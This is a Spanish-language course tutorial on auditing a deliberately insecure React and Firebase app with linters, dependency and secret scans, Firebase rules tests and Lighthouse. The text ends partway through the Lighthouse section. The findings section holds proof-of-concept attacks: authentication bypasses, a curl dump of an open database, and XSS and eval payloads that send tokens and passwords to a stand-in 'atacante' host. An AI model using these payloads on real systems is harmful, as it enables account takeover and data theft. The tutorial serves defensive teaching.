# Tutorial — Proyecto II: Pruebas integrales de calidad y seguridad

**Aplicación bajo prueba:** `Aplicacion-IIcuatri2026` (React 19 + Vite 7 + Firebase Auth + Realtime Database)
**Fecha del análisis base:** 2026-08-05
**Autor del reporte:** _(completar)_

---

## Índice

1. [Objetivo y alcance](#1-objetivo-y-alcance)
2. [Preparación del entorno](#2-preparación-del-entorno)
3. [Fase 1 — Análisis estático de calidad (ESLint + SonarQube)](#3-fase-1--análisis-estático-de-calidad)
4. [Fase 2 — Pruebas de seguridad](#4-fase-2--pruebas-de-seguridad)
5. [Fase 3 — Pruebas de rendimiento con Lighthouse](#5-fase-3--pruebas-de-rendimiento-con-lighthouse)
6. [Fase 4 — Pruebas automatizadas (unitarias y E2E)](#6-fase-4--pruebas-automatizadas)
7. [Fase 5 — Plantilla del reporte final](#7-fase-5--plantilla-del-reporte-final)
8. [Anexo A — Correcciones propuestas (código listo para aplicar)](#anexo-a--correcciones-propuestas)
9. [Anexo B — Checklist de entrega](#anexo-b--checklist-de-entrega)

> ⚠️ **Nota sobre este documento:** este archivo es **solo documentación**. Ninguna de las
> correcciones del Anexo A fue aplicada al código: son propuestas que usted decide si aplica.
> Aplicarlas modifica archivos existentes del proyecto, así que hágalo en una rama aparte
> (`git checkout -b fix/seguridad`) para poder comparar el "antes" y el "después".

---

## 1. Objetivo y alcance

### Qué vamos a hacer

Someter una aplicación React real a un ciclo completo de **verificación no funcional**:

| Fase | Pregunta que responde | Herramienta |
|------|----------------------|-------------|
| Calidad estática | ¿El código tiene defectos detectables sin ejecutarlo? | ESLint + `eslint-plugin-security`, SonarQube |
| Dependencias | ¿Las librerías que uso tienen CVEs conocidos? | `npm audit` |
| Secretos | ¿Hay credenciales expuestas en el repositorio? | `gitleaks` / búsqueda por patrones |
| Backend | ¿Las reglas de Firebase protegen los datos? | Firebase Emulator + `@firebase/rules-unit-testing` |
| AuthN/AuthZ | ¿Se puede saltar el login o escalar privilegios? | Pruebas manuales en DevTools |
| Rendimiento | ¿La app es rápida, accesible y bien construida? | Lighthouse |
| Regresión | ¿Las correcciones rompen algo? | Vitest + Playwright |

### Por qué importa

Un bug funcional lo reporta el usuario; una **vulnerabilidad no la reporta nadie** hasta que
alguien la explota. En una app cliente-servidor como esta, todo el código de React viaja al
navegador del atacante: **cualquier "control de seguridad" implementado solo en el frontend es
decorativo**. El objetivo del ejercicio es aprender a demostrar eso con evidencia medible
(números de linter, CVEs, puntajes de Lighthouse) y no con opiniones.

### Marco de referencia

Se clasifican los hallazgos con **OWASP Top 10 (2021)**, que es el estándar de facto para
reportar riesgos web:

- **A01** Broken Access Control
- **A02** Cryptographic Failures / exposición de datos sensibles
- **A03** Injection (incluye XSS y evaluación de código)
- **A05** Security Misconfiguration
- **A06** Vulnerable and Outdated Components
- **A07** Identification and Authentication Failures
- **A09** Security Logging and Monitoring Failures

---

## 2. Preparación del entorno

### 2.1 Requisitos

- Node.js 20 LTS o 22 LTS (ver nota de compatibilidad más abajo)
- npm 10+
- Google Chrome (para Lighthouse)
- Docker Desktop (opcional, solo para SonarQube local)
- Java 17+ (opcional, solo si corre `sonar-scanner` sin Docker)

### 2.2 Instalación

```bash
npm install
```

### 2.3 Congelar la línea base

Antes de tocar nada, guarde el estado inicial. **Sin línea base no hay "antes y después"**, y el
reporte final exige comparar métricas.

```bash
git checkout -b auditoria/linea-base
```

Cree una carpeta para la evidencia (no se versiona, es material de respaldo del reporte):

```bash
mkdir -p reportes
```

### 2.4 Verificar la versión de Node

```bash
node -v
```

> **Hallazgo temprano (Q-07):** en el equipo de análisis se detectó **Node v25.4.0**. Node 25
> expone un global experimental `localStorage` que **pisa el `localStorage` de jsdom** y rompe
> las pruebas unitarias con `TypeError: localStorage.getItem is not a function`. Use Node 20 o 22
> LTS para que las pruebas sean reproducibles. Esto es un problema de **calidad del entorno de
> pruebas**, no del código de la app, y debe documentarse como tal.

---

## 3. Fase 1 — Análisis estático de calidad

### 3.1 Qué es el análisis estático y por qué se hace primero

El análisis estático (SAST) revisa el **código fuente sin ejecutarlo**, buscando patrones que se
sabe que producen defectos: variables sin usar, dependencias faltantes en hooks, `eval()`,
expresiones regulares vulnerables, accesos dinámicos a objetos, etc.

Se hace primero porque es **el más barato**: corre en segundos, no requiere desplegar nada y
encuentra la mayoría de los defectos triviales antes de gastar tiempo en pruebas manuales.

### 3.2 ESLint con reglas de seguridad

El proyecto ya trae `eslint-plugin-security` configurado en `eslint.config.js`:

```js
import js from '@eslint/js';
import reactHooks from 'eslint-plugin-react-hooks';
import reactRefresh from 'eslint-plugin-react-refresh';
import security from 'eslint-plugin-security';
import globals from 'globals';

export default [
  { ignores: ['dist/**', 'coverage/**'] },
  js.configs.recommended,
  {
    files: ['**/*.{js,jsx}'],
    plugins: { 'react-hooks': reactHooks, 'react-refresh': reactRefresh, security },
    rules: {
      ...reactHooks.configs.recommended.rules,
      ...security.configs.recommended.rules,
      'no-console': ['warn', { allow: ['warn', 'error'] }]
    }
  }
];
```

**Ejecución:**

```bash
npm run lint
```

**Para guardar evidencia en JSON (necesario para el reporte y para SonarQube):**

```bash
npx eslint . -f json -o reportes/eslint-baseline.json
```

**Para un reporte HTML navegable que se puede adjuntar como anexo:**

```bash
npx eslint . -f html -o reportes/eslint-baseline.html
```

### 3.3 Resultado medido en la línea base

```
✖ 66 problemas (56 errores, 10 advertencias)
```

Distribución por regla:

| Regla | Ocurrencias | Severidad | Interpretación |
|-------|-------------|-----------|----------------|
| `no-unused-vars` | 56 | error | **Falso positivo masivo** (ver 3.4) |
| `no-console` | 3 | warning | Logging de credenciales en producción |
| `security/detect-object-injection` | 2 | warning | Acceso dinámico a propiedades en `DebugPage.jsx` |
| `security/detect-unsafe-regex` | 1 | warning | ReDoS en `validators.js` |
| `security/detect-eval-with-expression` | 1 | warning | `eval()` con input del usuario |
| `react-hooks/exhaustive-deps` | 1 | warning | Dependencia faltante en `TaskForm.jsx` |
| `react-refresh/only-export-components` | 1 | warning | `AuthContext.jsx` exporta contexto y componente |
| `no-eval` (suprimida con `eslint-disable`) | 1 | — | Regla desactivada a mano para ocultar el defecto |

### 3.4 Interpretar el resultado: el linter también se audita

**Los 56 errores `no-unused-vars` son ruido, no defectos.** Ejemplo real en
`src/routes/AppRouter.jsx:1`:

```
1:10  error  'Navigate' is defined but never used
1:20  error  'Route' is defined but never used
1:27  error  'Routes' is defined but never used
```

Esos tres símbolos **sí se usan**, pero dentro de JSX (`<Route ... />`). La configuración no
incluye `eslint-plugin-react`, así que ESLint no entiende que JSX cuenta como uso.

**Por qué esto importa (hallazgo Q-01):** un linter que grita 56 falsos positivos es un linter
que el equipo aprende a ignorar. Los **10 hallazgos reales** (los de `security/*`, `no-console`
y `react-hooks`) quedan enterrados en el ruido. La primera mejora de calidad no es tocar el
código de la app: es **arreglar el instrumento de medición**.

**Corrección propuesta** (ver Anexo A.1 para el archivo completo):

```js
// Agregar al arreglo de configuración, antes del bloque de reglas:
import react from 'eslint-plugin-react';

// ...
{
  settings: { react: { version: 'detect' } },
  plugins: { react /*, ... */ },
  rules: {
    ...react.configs.flat.recommended.rules,
    ...react.configs.flat['jsx-runtime'].rules,
    'no-unused-vars': ['error', { argsIgnorePattern: '^_', varsIgnorePattern: '^[A-Z]' }]
  }
}
```

Instalación del plugin:

```bash
npm install --save-dev eslint-plugin-react
```

**Resultado esperado tras la corrección:** de 66 problemas se baja a ~10, todos accionables.

### 3.5 Endurecer las reglas (opcional pero recomendado)

Reglas adicionales que convierten en error lo que hoy pasa desapercibido:

```js
rules: {
  'no-eval': 'error',
  'no-implied-eval': 'error',
  'no-restricted-properties': [
    'error',
    { object: 'localStorage', property: 'setItem',
      message: 'No guardar datos sensibles en localStorage. Use el SDK de Firebase.' }
  ],
  'react/no-danger': 'error',
  'security/detect-eval-with-expression': 'error',
  'security/detect-unsafe-regex': 'error'
}
```

**Por qué importa:** `react/no-danger` habría bloqueado en el primer commit los tres
`dangerouslySetInnerHTML` que hoy son la vía de XSS almacenado.

### 3.6 SonarQube

ESLint detecta patrones línea a línea. SonarQube agrega lo que ESLint no da: **duplicación de
código, complejidad ciclomática, deuda técnica en horas, cobertura y un "Quality Gate"**
(aprobado/reprobado) que se puede exigir en CI.

#### Opción A — SonarQube local con Docker

Levantar el servidor:

```bash
docker run -d --name sonarqube -p 9000:9000 sonarqube:community
```

Entrar a `http://localhost:9000` (usuario `admin`, contraseña `admin`; el sistema pide cambiarla
en el primer ingreso), crear un proyecto manual llamado `aplicacion-iicuatri2026` y generar un
token de análisis.

Crear el archivo de configuración **`sonar-project.properties`** en la raíz:

```properties
sonar.projectKey=aplicacion-iicuatri2026
sonar.projectName=Aplicacion IIcuatri2026
sonar.projectVersion=1.0.0

sonar.sources=src
sonar.exclusions=**/node_modules/**,**/dist/**,**/*.test.jsx,**/*.test.js,**/e2e/**

sonar.tests=src/tests
sonar.test.inclusions=**/*.test.js,**/*.test.jsx

sonar.javascript.lcov.reportPaths=coverage/lcov.info
sonar.eslint.reportPaths=reportes/eslint-baseline.json

sonar.sourceEncoding=UTF-8
```

Generar la cobertura que Sonar va a importar:

```bash
npx vitest run --coverage
```

> Requiere `npm install --save-dev @vitest/coverage-v8` y agregar
> `coverage: { reporter: ['text', 'lcov'] }` dentro de `test` en `vite.config.js`.

Ejecutar el escáner (reemplace `SU_TOKEN`):

```bash
docker run --rm --network host -v "%cd%:/usr/src" sonarsource/sonar-scanner-cli -Dsonar.token=SU_TOKEN
```

En PowerShell use `${PWD}` en lugar de `%cd%`:

```bash
docker run --rm --network host -v "${PWD}:/usr/src" sonarsource/sonar-scanner-cli -Dsonar.token=SU_TOKEN
```

#### Opción B — SonarCloud (sin Docker, gratis para repos públicos)

```bash
npx sonarqube-scanner -Dsonar.host.url=https://sonarcloud.io -Dsonar.token=SU_TOKEN -Dsonar.organization=SU_ORG
```

#### Opción C — Equivalente sin Sonar

Si no puede levantar SonarQube, estas tres herramientas cubren lo esencial y son suficientes
para documentar el hallazgo:

Complejidad y mantenibilidad:

```bash
npx eslint . --rule "{\"complexity\":[\"warn\",8]}"
```

Código duplicado:

```bash
npx jscpd src --min-lines 5 --reporters console,html --output reportes/jscpd
```

Código muerto (exports e imports no usados):

```bash
npx knip
```

**Qué mirar en los resultados de Sonar:**

- **Security Hotspots** — debería marcar `eval()`, los `dangerouslySetInnerHTML` y los secretos
  hardcodeados.
- **Reliability** — `key={index}` en `TaskList.jsx`, el `useEffect` sin `unsubscribe`.
- **Maintainability** — deuda técnica en horas; sirve para justificar el esfuerzo de corrección.
- **Coverage** — con solo 12 pruebas, la cobertura estará muy por debajo del 80 % típico del
  Quality Gate.

---

## 4. Fase 2 — Pruebas de seguridad

### 4.1 Auditoría de dependencias (`npm audit`) — OWASP A06

#### Qué hace

Compara el árbol de dependencias contra la base de datos de advisories de GitHub/npm y reporta
CVEs conocidos con su severidad y su versión de corrección.

#### Por qué importa

Entre el 70 % y el 90 % del código que se envía al navegador **no lo escribió usted**. Una
vulnerabilidad en una transitiva es tan explotable como una propia, y es la vía de entrada más
común en ataques reales.

#### Ejecución

```bash
npm audit
```

Guardar evidencia:

```bash
npm audit --json > reportes/npm-audit-baseline.json
```

Ver solo lo que puede llegar a producción (ignora `devDependencies`):

```bash
npm audit --omit=dev
```

#### Resultado medido en la línea base

**7 vulnerabilidades: 5 altas, 1 moderada, 1 baja** (383 dependencias: 94 de producción,
290 de desarrollo).

| Paquete | Severidad | Rango vulnerable | Problema | ¿Llega a producción? |
|---------|-----------|------------------|----------|----------------------|
| `react-router` | **alta** | 7.12.0 – 8.2.0 | CSRF bypass en modo RSC (`GHSA-qwww-vcr4-c8h2`) | **Sí** |
| `react-router-dom` | **alta** | ≥ 7.12.0-pre.0 | Hereda de `react-router` | **Sí** |
| `protobufjs` | moderada | 7.5.0 – 7.6.4 | DoS por bucle infinito al parsear `.proto` | **Sí** (vía `firebase`) |
| `postcss` | **alta** | ≤ 8.5.22 | Path traversal al auto-cargar source maps | No (build) |
| `js-yaml` | **alta** | 4.0.0 – 4.2.0 | Consumo cuadrático de CPU con merge keys | No (ESLint) |
| `brace-expansion` | **alta** | ≤ 1.1.17 | DoS por expansión exponencial | No (tooling) |
| `esbuild` | baja | 0.27.3 – 0.28.0 | Lectura arbitraria de archivos con el dev server en Windows | No (dev) |

#### Corrección

Todas tienen corrección disponible (`fixAvailable: true`):

```bash
npm audit fix
```

Verificar que no se rompió nada antes de dar por buena la corrección:

```bash
npm run lint && npx vitest run && npm run build
```

> **Criterio profesional:** distinga siempre entre vulnerabilidades **de producción** y **de
> tooling**. `esbuild` (baja, solo dev server en Windows) no justifica un `npm audit fix --force`
> que suba de major y rompa el build; `react-router` (alta, en el bundle del cliente) sí es
> prioritario. Documente esa distinción en el reporte: demuestra criterio, no solo capacidad de
> copiar la salida del comando.

### 4.2 Exposición de datos sensibles en el código fuente — OWASP A02

#### Qué hace

Buscar en el código y en el historial de Git patrones de credenciales: llaves de API, tokens,
contraseñas, cadenas de conexión.

#### Por qué importa

Todo lo que está en `src/` **se compila dentro del bundle** y se descarga en el navegador de
cualquier visitante. "Ofuscado" no es "secreto": basta abrir DevTools → Sources para leerlo. Si
el secreto además está en Git, borrarlo en un commit posterior **no lo elimina**: sigue en el
historial.

#### Ejecución — herramienta automatizada

```bash
docker run --rm -v "${PWD}:/path" zricethezav/gitleaks:latest detect --source=/path --report-path=/path/reportes/gitleaks.json
```

Alternativa sin Docker:

```bash
npx --yes trufflehog filesystem . --json > reportes/trufflehog.json
```

#### Ejecución — búsqueda manual por patrones

```bash
npx --yes ripgrep -n -i "password|secret|api[_-]?key|token|sk_live|AIza" src/
```

Y sobre el historial completo de Git:

```bash
git log -p --all -S "sk_live" --oneline
```

#### Resultado medido en la línea base

**8 secretos hardcodeados** exportados desde `src/firebase/config.js:22-29`, más un bloque
adicional en `src/utils/constants.js:11-31`:

| Ubicación | Variable | Tipo | Riesgo |
|-----------|----------|------|--------|
| `src/firebase/config.js:23` | `ADMIN_PASSWORD` | Contraseña de administrador | **Crítico** |
| `src/firebase/config.js:25` | `JWT_SECRET` | Llave de firma de tokens | **Crítico** |
| `src/firebase/config.js:27` | `STRIPE_SECRET_KEY` | `sk_live_…` (clave viva de pagos) | **Crítico** |
| `src/firebase/config.js:28` | `SENDGRID_API_KEY` | `SG.…` (envío de correo) | **Alto** |
| `src/firebase/config.js:29` | `DATABASE_ADMIN_TOKEN` | Token admin de Firebase | **Crítico** |
| `src/firebase/config.js:26` | `ENCRYPTION_KEY` | Llave de cifrado | **Alto** |
| `src/utils/constants.js:12-16` | `ADMIN_CREDENTIALS` | Usuario + contraseña + `bypass_token` | **Crítico** |
| `src/utils/constants.js:30-31` | `AUTH_BYPASS_KEY`, `MASTER_KEY` | Tokens de bypass de autenticación | **Crítico** |
| `src/utils/constants.js:24-28` | `INTERNAL_ENDPOINTS` | URL de backup de la BD con token en query string | **Alto** |

Además, `src/pages/DebugPage.jsx` **importa y renderiza los ocho secretos en pantalla** en una
ruta pública sin autenticación (ver 4.4).

> **Nota sobre `apiKey` de Firebase:** la `apiKey` del bloque `firebaseConfig` **no es un
> secreto**; Firebase la diseñó para ser pública y sirve para identificar el proyecto. Lo que
> protege los datos son las **Security Rules** (sección 4.3). Confundir ambas cosas es el error
> conceptual más frecuente en este tipo de auditorías: repórtela como "informativa", no como
> crítica, y explique por qué. Las otras ocho variables **sí** son secretos reales.

#### Hallazgo adicional: `.env` versionado (S-09)

```bash
git ls-files | grep -E "^\.env$"
```

Devuelve `.env`, es decir: **el archivo de variables de entorno está bajo control de versiones**,
y `.gitignore` tiene la sección "Environment variables" **vacía**:

```gitignore
# Environment variables
            ← sin ninguna regla
```

El archivo contiene una entrada `password = …`. Corrección:

```gitignore
# Environment variables
.env
.env.local
.env.*.local
```

Y sacarlo del índice sin borrar el archivo local:

```bash
git rm --cached .env
```

> **Importante:** el `.gitignore` no borra lo que ya está en el historial. Cualquier secreto real
> que haya sido commiteado **debe rotarse** (regenerar la llave en Stripe, SendGrid, Firebase…).
> Reescribir el historial con `git filter-repo` o BFG es un paso adicional, **nunca un
> sustituto** de la rotación.

#### Hallazgo adicional: `node_modules/` y `dist/` versionados (Q-08)

```bash
git ls-files | grep -c "^node_modules/"
```

`node_modules/` está en el `.gitignore` pero fue commiteado **antes** de que la regla existiera,
así que Git lo sigue rastreando. Infla el repositorio, hace inservibles los diffs y —lo
importante para seguridad— **congela versiones vulnerables** que `npm audit fix` no puede
corregir de forma limpia.

```bash
git rm -r --cached node_modules dist
```

### 4.3 Firebase Security Rules — OWASP A01 / A05

#### Qué hace

Verificar que las reglas del Realtime Database impidan que un cliente lea o escriba datos que no
le pertenecen.

#### Por qué importa

**Las reglas son el único control de acceso real de esta aplicación.** Cualquiera puede hablar
directamente con la URL del Realtime Database con `curl`, sin pasar por su React. Si las reglas
son permisivas, no importa cuántas validaciones tenga el frontend.

#### Estado actual (crítico)

`database.rules.json` en la raíz del proyecto:

```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

Esto significa: **lectura y escritura totales, sin autenticación, para todo internet.**

Y el `README.md` del proyecto **afirma lo contrario** ("Las reglas de Realtime Database incluidas
son deliberadamente restrictivas") mostrando unas reglas por usuario que **no son las que están
desplegadas**. Documentación que contradice la configuración real es en sí mismo un hallazgo:
induce a que nadie revise el archivo.

#### Prueba de concepto (demuestra la explotación)

Con la base abierta, cualquiera puede volcar toda la base de datos —incluida la colección
`users`, que según `authService.js:32-38` **almacena contraseñas en texto plano**— sin
autenticarse:

```bash
curl "https://malas-practicas-default-rtdb.firebaseio.com/users.json"
```

> **Solo ejecute esto contra el proyecto Firebase de su propio curso.** Lanzar peticiones contra
> bases de datos de terceros no está autorizado por este ejercicio.

#### Reglas corregidas

```json
{
  "rules": {
    ".read": false,
    ".write": false,
    "users": {
      "$uid": {
        ".read": "auth != null && auth.uid === $uid",
        ".write": "auth != null && auth.uid === $uid",
        ".validate": "newData.hasChildren(['email', 'displayName', 'createdAt'])",
        "password": { ".validate": false },
        "role": { ".write": false },
        "email": { ".validate": "newData.isString() && newData.val().length <= 254" },
        "displayName": { ".validate": "newData.isString() && newData.val().length <= 80" }
      }
    },
    "tasks": {
      "$uid": {
        ".read": "auth != null && auth.uid === $uid",
        ".write": "auth != null && auth.uid === $uid",
        "$taskId": {
          ".validate": "newData.hasChildren(['title', 'status', 'createdAt', 'updatedAt'])",
          "title": { ".validate": "newData.isString() && newData.val().length <= 120" },
          "description": { ".validate": "newData.isString() && newData.val().length <= 2000" },
          "status": { ".validate": "newData.val().matches(/^(pending|in-progress|completed)$/)" },
          "createdAt": { ".validate": "newData.isNumber()" },
          "updatedAt": { ".validate": "newData.isNumber()" },
          "$other": { ".validate": false }
        }
      }
    }
  }
}
```

Claves del diseño:

- `".read": false` / `".write": false` en la raíz → **denegar por defecto**; solo se abre lo que
  se declara explícitamente más abajo.
- `auth.uid === $uid` → un usuario solo alcanza su propia rama. Esto **cierra el IDOR** de
  `getTasksFromAnyUser()` desde el servidor, aunque la función siga existiendo en el cliente.
- `"password": { ".validate": false }` → hace **imposible** escribir el campo `password`, incluso
  si el cliente lo intenta.
- `"role": { ".write": false }` → el rol **nunca** lo escribe el cliente. Se asigna con Custom
  Claims desde el Admin SDK.
- `"$other": { ".validate": false }` → rechaza cualquier campo no declarado.

#### Probar las reglas automáticamente

Instalar el emulador y la librería de pruebas:

```bash
npm install --save-dev firebase-tools @firebase/rules-unit-testing
```

Archivo de prueba **`src/tests/database.rules.test.js`**:

```js
import { readFileSync } from 'node:fs';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  assertFails,
  assertSucceeds,
  initializeTestEnvironment
} from '@firebase/rules-unit-testing';

let testEnv;

beforeAll(async () => {
  testEnv = await initializeTestEnvironment({
    projectId: 'demo-auditoria',
    database: {
      host: '127.0.0.1',
      port: 9000,
      rules: readFileSync('database.rules.json', 'utf8')
    }
  });
});

afterAll(async () => {
  await testEnv.cleanup();
});

describe('Reglas del Realtime Database', () => {
  it('un usuario anonimo NO puede leer las tareas de nadie', async () => {
    const db = testEnv.unauthenticatedContext().database();
    await assertFails(db.ref('tasks/alice').get());
  });

  it('un usuario autenticado puede leer SUS tareas', async () => {
    const db = testEnv.authenticatedContext('alice').database();
    await assertSucceeds(db.ref('tasks/alice').get());
  });

  it('IDOR: alice NO puede leer las tareas de bob', async () => {
    const db = testEnv.authenticatedContext('alice').database();
    await assertFails(db.ref('tasks/bob').get());
  });

  it('nadie puede escribir un campo password en users', async () => {
    const db = testEnv.authenticatedContext('alice').database();
    await assertFails(
      db.ref('users/alice').set({
        email: 'a@b.com',
        displayName: 'Alice',
        createdAt: Date.now(),
        password: 'texto-plano'
      })
    );
  });

  it('un cliente no puede auto-asignarse el rol admin', async () => {
    const db = testEnv.authenticatedContext('alice').database();
    await assertFails(db.ref('users/alice/role').set('admin'));
  });

  it('rechaza titulos de mas de 120 caracteres', async () => {
    const db = testEnv.authenticatedContext('alice').database();
    await assertFails(
      db.ref('tasks/alice/t1').set({
        title: 'x'.repeat(200),
        status: 'pending',
        createdAt: Date.now(),
        updatedAt: Date.now()
      })
    );
  });
});
```

Ejecutar contra el emulador:

```bash
npx firebase emulators:exec --only database "npx vitest run src/tests/database.rules.test.js"
```

**Por qué esto importa:** convierte la seguridad del backend en una **prueba de regresión
automatizada**. Si alguien vuelve a abrir las reglas en un commit futuro, el pipeline falla.

### 4.4 Autenticación y autorización — OWASP A01 / A07

#### Hallazgo S-01: bypass de rutas protegidas por `localStorage`

`src/routes/ProtectedRoute.jsx:22-33`:

```jsx
const isAuthenticatedInStorage = localStorage.getItem('isAuthenticated') === 'true';
const bypassToken = new URLSearchParams(location.search).get('bypass');
const hasBypass = bypassToken === AUTH_BYPASS_KEY;

if (!user && !isAuthenticatedInStorage && !hasBypass) {
  return <Navigate replace state={{ from: location }} to="/login" />;
}
```

La condición es un **OR**: basta que *una* de las tres se cumpla para entrar. Y dos de las tres
las controla el atacante.

**Prueba de concepto A** — abrir la consola del navegador en la app y ejecutar:

```js
localStorage.setItem('isAuthenticated', 'true');
location.href = '/dashboard';
```

**Prueba de concepto B** — sin siquiera abrir la consola, solo con la URL:

```text
http://localhost:5173/dashboard?bypass=skip_auth_check_2024
```

El token está publicado en `src/utils/constants.js:30` y viaja en el bundle.

#### Hallazgo S-02: escalación de privilegios (fail-open)

`src/routes/AdminRoute.jsx:21-27`:

```jsx
const role = localStorage.getItem('user_role');

// Si no hay rol guardado, se asume 'admin' por defecto
if (!role || role === 'admin') {
  return <Outlet />;
}
```

Dos defectos combinados:

1. El rol se lee de `localStorage`, que el cliente controla.
2. **Fail-open:** si *no hay* rol, se concede acceso de administrador. Un usuario que nunca inició
   sesión llega a `/admin`.

**Prueba de concepto:**

```js
localStorage.clear();
location.href = '/admin';
```

#### Hallazgo S-03: contraseñas en texto plano en tres lugares

`src/services/authService.js`:

```js
console.log('Registrando usuario:', { email, password, displayName }); // línea 15
localStorage.setItem('user_password', password);                       // línea 24
await set(ref(database, `users/${credential.user.uid}`), {
  email, password, displayName, role: 'user', createdAt: Date.now()    // línea 34
});
```

La contraseña queda simultáneamente: (a) en la consola del navegador, (b) en `localStorage`, y
(c) en la base de datos —que además está abierta al público (4.3)—. `logoutUser()` en la
línea 79 borra `isAuthenticated` pero **deja la contraseña guardada** después de cerrar sesión.
`ProfilePage.jsx:60` la muestra en pantalla.

#### Hallazgo S-04: enumeración de usuarios

`src/services/authService.js:58-66`:

```js
if (error.code === 'auth/user-not-found') {
  throw new Error(`El correo ${email} no esta registrado en el sistema.`);
}
if (error.code === 'auth/wrong-password') {
  throw new Error(`Contraseña incorrecta para la cuenta ${email}.`);
}
```

Distinguir "no existe" de "contraseña incorrecta" permite a un atacante **enumerar las cuentas
válidas** del sistema probando correos. La respuesta correcta es siempre la misma:
_"Correo o contraseña incorrectos."_

#### Hallazgo S-05: ruta `/debug` pública

`src/pages/DebugPage.jsx` está registrada **fuera** de `ProtectedRoute` y renderiza en pantalla:
los ocho secretos importados de `firebase/config.js`, `ADMIN_CREDENTIALS`, el token de bypass,
los endpoints internos, todo el `localStorage`, todo el `sessionStorage` y `document.cookie`.

**Prueba de concepto:** visitar `/debug` sin ninguna sesión.

Corrección: **eliminar el archivo y su ruta**. Si se necesita para desarrollo, condicionarla:

```jsx
{import.meta.env.DEV && <Route element={<DebugPage />} path="/debug" />}
```

#### Hallazgo S-06: XSS almacenado

`src/components/TaskList.jsx:36-37`:

```jsx
<h3 dangerouslySetInnerHTML={{ __html: task.title }} />
<p dangerouslySetInnerHTML={formatTaskDescription(task.description)} />
```

React escapa el HTML por defecto; `dangerouslySetInnerHTML` **desactiva esa protección**. Como
`validateTask()` no valida longitud ni contenido y `createTask()` guarda el payload tal cual, el
título de una tarea es un vector de XSS **persistente**.

**Prueba de concepto** — crear una tarea con este título:

```html
<img src=x onerror="alert(document.cookie)">
```

Combinado con S-03 (token en `localStorage`), el payload real sería un robo de sesión:

```html
<img src=x onerror="fetch('https://atacante/?t='+localStorage.getItem('auth_token'))">
```

`DashboardPage.jsx:126` y `:134` repiten el patrón con datos que vienen de la base de datos.

#### Hallazgo S-07: ejecución de código arbitrario (`eval`)

`src/utils/validators.js:76-80`:

```js
export function evaluateFormula(expression) {
  // eslint-disable-next-line no-eval
  return eval(expression);
}
```

Se invoca desde `TaskForm.jsx:41` con texto del formulario. **Prueba de concepto** — escribir en
el campo de fórmula:

```js
fetch('https://atacante/?d='+localStorage.getItem('user_password'))
```

Note el `eslint-disable-next-line`: alguien **silenció deliberadamente** la alerta del linter.
Todo `eslint-disable` de una regla de seguridad debe justificarse en revisión de código.

#### Hallazgo S-08: ReDoS

`src/utils/validators.js:6`:

```js
const emailPattern = /^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+$/;
```

El grupo `([a-zA-Z0-9]+)*` —un cuantificador dentro de otro— genera **backtracking
catastrófico**. Detectado por `security/detect-unsafe-regex`.

**Prueba de concepto** — medir cuánto tarda:

```bash
node -e "const r=/^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+$/;const s='a'.repeat(30)+'!';console.time('redos');r.test(s);console.timeEnd('redos')"
```

JavaScript es de un solo hilo: mientras el regex hace backtracking, **la interfaz queda
congelada**. En un servidor sería una denegación de servicio.

#### Hallazgo S-10: fuga de memoria y suscripción sin limpiar

`src/context/AuthContext.jsx:22-34` llama a `onAuthStateChanged` sin guardar el `unsubscribe` ni
retornar la función de limpieza del `useEffect`. `src/hooks/useTasks.js:32` hace lo mismo con
`subscribeToTasks` (el linter lo reporta como `'unsubscribe' is assigned a value but never
used`). Cada montaje deja un listener vivo contra Firebase: **fuga de memoria y consumo de cuota**.

### 4.5 Resumen ejecutable de la fase de seguridad

```bash
npm audit --json > reportes/npm-audit-baseline.json
```

```bash
npx eslint . -f json -o reportes/eslint-baseline.json
```

```bash
npx --yes ripgrep -n -i "password|secret|api[_-]?key|token|sk_live|AIza" src/ > reportes/secretos.txt
```

```bash
git ls-files | grep -E "^(\.env|node_modules/|dist/)" > reportes/archivos-sensibles-versionados.txt
```

---

## 5. Fase 3 — Pruebas de rendimiento con Lighthouse

### 5.1 Qué es Lighthouse y por qué se corre sobre el build

Lighthouse es la herramienta de auditoría de Google que mide cuatro categorías:
**Performance, Accessibility, Best Practices y SEO**.

Debe correrse **siempre sobre el build de producción**, nunca sobre `npm run dev`: el servidor de
desarrollo no minifica, no comprime, incluye React en modo desarrollo y sirve módulos sin
empaquetar. Medir en dev da números falsos —y sistemáticamente peores— que no representan lo que
recibe el usuario.

### 5.2 Preparar la aplicación

> ⚠️ `npm run build` **sobrescribe la carpeta `dist/`**, que en este repositorio está versionada.
> Haga commit o stash de su trabajo antes de ejecutarlo.

```bash
npm run build
```

```bash
npm run preview
```

El servidor queda en `http://localhost:4173`. Déjelo corriendo en una terminal aparte.

### 5.3 Ejecutar Lighthouse desde la línea de comandos

```bash
npx --yes lighthouse http://localhost:4173 --output=html --output=json --output-path=./reportes/lighthouse-antes --chrome-flags="--headless" --preset=desktop
```

Para la vista móvil (la que Google usa para posicionamiento, y la más exigente):

```bash
npx --yes lighthouse http://localhost:4173 --output=html --output-path=./reportes/lighthouse-antes-mobile --chrome-flags="--headless"
```

Alternativa gráfica: Chrome → **F12** → pestaña **Lighthouse** → *Analyze page load*. Úsela
siempre en **ventana de incógnito**, porque las extensiones alteran los resultados.

### 5.4 Auditar también las rutas internas

Un SPA no se agota en la portada. Como `/dashboard` y `/admin` son alcanzables sin autenticarse
(hallazgos S-01 y S-02), se pueden auditar directamente:

```bash
npx --yes lighthouse http://localhost:4173/dashboard --output=html --output-path=./reportes/lighthouse-dashboard --chrome-flags="--headless"
```

### 5.5 Cómo leer las métricas

| Métrica | Qué mide | Meta |
|---------|----------|------|
| **FCP** (First Contentful Paint) | Primer pixel de contenido | < 1.8 s |
| **LCP** (Largest Contentful Paint) | El elemento principal ya es visible | < 2.5 s |
| **TBT** (Total Blocking Time) | Tiempo que el hilo principal estuvo bloqueado | < 200 ms |
| **CLS** (Cumulative Layout Shift) | Cuánto "salta" el layout | < 0.1 |
| **Speed Index** | Velocidad de llenado visual | < 3.4 s |

Escala de puntaje: **0–49 rojo, 50–89 naranja, 90–100 verde**.

### 5.6 Qué esperar en esta aplicación concreta

Puntos que Lighthouse va a marcar, con su causa ya identificada en el código:

| Categoría | Auditoría que fallará | Causa en el código |
|-----------|----------------------|--------------------|
| Performance | *Reduce unused JavaScript* | `getAnalytics()` se inicializa siempre en `config.js:47`, aunque nunca se use |
